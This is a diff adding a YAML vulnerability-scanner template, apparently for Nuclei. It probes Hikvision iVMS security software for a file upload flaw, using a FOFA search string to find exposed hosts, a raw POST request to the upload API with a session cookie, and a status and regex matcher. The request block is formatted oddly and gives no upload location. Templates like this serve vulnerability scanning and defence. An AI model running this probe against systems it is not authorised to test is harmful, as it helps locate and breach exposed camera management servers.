@@ -1,0 +1,57 @@
+id: poc-tohkoz3t8lqygs3s
+info:
+  name: 海康iVMS综合安防存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tohkoz3t8lqygs3s'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tohkoz3t8lqygs3s
+    fofa: web.body="/views/home/file/installPackage.rar"
+http:
+- raw:
+  - 'POST /eps/api/resourceOperations/upload HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+
+
+    service=http%3A%2F%2Fip:port%3Ax%2Fhome%2Findex.action
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?token)(?=.*?empty).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
